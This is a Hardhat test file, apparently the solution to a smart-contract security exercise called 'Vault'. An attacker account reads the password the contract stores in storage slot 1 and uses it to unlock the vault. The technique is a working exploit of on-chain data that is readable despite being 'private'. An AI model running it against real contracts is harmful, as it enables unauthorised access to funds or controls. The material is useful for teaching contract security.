const { expect } = require("chai");
const { ethers } = require("hardhat");
const { v4: uuidv4 } = require('uuid');
const Web3Utils = require('web3-utils');

describe("Exercise 8 - Vault", function () {

    let deployer, attacker;
    const PASSWORD = uuidv4().slice(0, 7);

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        const Vault = await ethers.getContractFactory("Vault");

        //A bytes32 hex string should have 2+64=66 char length.
        const passHex = Web3Utils.asciiToHex(PASSWORD);
        this.contract = await Vault.deploy(ethers.utils.hexZeroPad(passHex, 32));

        await this.contract.deployed();

        const locked = await this.contract.locked();
        expect(locked).to.be.true;
        console.log(`Vault is locked? ${locked}`);
    });


    it("Unlock vault", async function () {

        // Read contracts storage values, 
        // 1st storage value the boolean that belongs to the locked parameter
        // 2nd storage value is the password
        // for (let i = 0; i < 10; i++) {
        //     const storageVal = await ethers.provider.getStorageAt(this.contract.address, i);
        //     console.log(storageVal)
        // }
        const storedPass = await ethers.provider.getStorageAt(this.contract.address, 1);
        await this.contract.connect(attacker).unlock(storedPass);

        const locked = await this.contract.connect(attacker).locked();
        expect(locked).to.be.false;
        console.log(`Vault is locked? ${locked}`);
    });

});
